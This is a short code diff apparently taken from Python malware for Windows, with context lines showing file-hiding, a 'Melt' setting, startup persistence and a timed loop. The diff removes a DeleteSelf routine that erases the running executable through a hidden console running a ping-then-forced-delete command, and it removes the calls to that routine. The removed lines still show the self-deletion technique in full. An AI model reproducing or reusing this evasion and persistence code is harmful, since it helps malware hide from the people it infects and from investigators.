@@ -351,15 +351,7 @@ class Utility:
             return http.request('GET', 'https://gstatic.com/generate_204').status == 204
         except Exception:
             return False
-
-    @staticmethod
-    def DeleteSelf():
-        (path, isExecutable) = Utility.GetSelf()
-        if isExecutable:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            os._exit(0)
-        else:
-            os.remove(path)
+        
 
     @staticmethod
     def HideSelf() -> None:
@@ -1430,7 +1422,6 @@ if os.name == 'nt':
                 Utility.HideSelf()
         elif Settings.Melt:
             Logger.info('Deleting the file')
-            Utility.DeleteSelf()
         try:
             if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                 Logger.info('Trying to put the file in startup')
@@ -1457,5 +1448,4 @@ if os.name == 'nt':
                 time.sleep(600)
         if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
             Logger.info('Deleting the file')
-            Utility.DeleteSelf()
         Logger.info('Process ended')
